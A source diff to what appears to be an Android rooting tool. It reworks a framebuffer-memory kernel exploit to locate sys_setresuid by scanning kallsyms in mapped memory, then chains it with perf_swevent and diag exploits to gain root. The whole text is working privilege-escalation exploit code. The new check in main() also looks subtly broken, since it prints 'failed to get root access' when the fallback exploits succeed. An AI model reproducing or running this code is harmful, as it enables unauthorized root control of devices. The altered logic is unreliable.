@@ -29,6 +29,7 @@
 #include "libdiagexploit/diag.h"
 #include "perf_swevent.h"
 #include "libfb_mem_exploit/fb_mem.h"
+#include "libkallsyms/kallsyms_in_memory.h"
 
 typedef struct _supported_device {
   const char *device;
@@ -157,12 +158,13 @@ attempt_diag_exploit(unsigned long int sys_setresuid_address)
 
 static uint32_t cmp_operation_code = 0xe3500000;
 static bool
-attempt_fb_mem_exploit(unsigned long int sys_setresuid_address)
+attempt_fb_mem_exploit(void)
 {
   int ret;
   int fd;
   void *mapped_address;
   void *mapped_sys_setresuid_address;
+  unsigned long int sys_setresuid_address = 0;
   int *cmp_operation;
 
   printf("Attempt fb mem exploit...\n");
@@ -170,6 +172,14 @@ attempt_fb_mem_exploit(unsigned long int sys_setresuid_address)
   mapped_address = fb_mem_mmap(&fd);
   if (mapped_address == MAP_FAILED) {
     printf("Failed to mmap due to %s\n", strerror(errno));
+
+    fb_mem_munmap(mapped_address, fd);
+    return false;
+  }
+
+  if (!kallsyms_in_memory_init(mapped_address, 0x10000000) ||
+      (sys_setresuid_address = kallsyms_in_memory_lookup_name("sys_setresuid")) == 0) {
+    printf("Failed to get sys_setresuid address due to %s\n", strerror(errno));
 
     fb_mem_munmap(mapped_address, fd);
     return false;
@@ -192,10 +202,14 @@ attempt_fb_mem_exploit(unsigned long int sys_setresuid_address)
 }
 
 static bool
-run_exploits(unsigned long int sys_setresuid_address)
+run_other_exploits(void)
 {
-  if (attempt_fb_mem_exploit(sys_setresuid_address))
-    return true;
+  unsigned long int sys_setresuid_address;
+
+  sys_setresuid_address = get_sys_setresuid_addresses();
+  if (!sys_setresuid_address) {
+    return false;
+  }
 
   if (attempt_perf_swevent_exploit(sys_setresuid_address))
     return true;
@@ -206,17 +220,9 @@ run_exploits(unsigned long int sys_setresuid_address)
 int
 main(int argc, char **argv)
 {
-  unsigned long int sys_setresuid_address;
   bool success;
 
-  sys_setresuid_address = get_sys_setresuid_addresses();
-  if (!sys_setresuid_address) {
-    exit(EXIT_FAILURE);
-  }
-
-  success = run_exploits(sys_setresuid_address);
-
-  if (!success) {
+  if (!attempt_fb_mem_exploit() && run_other_exploits()) {
     printf("failed to get root access\n");
     exit(EXIT_FAILURE);
   }
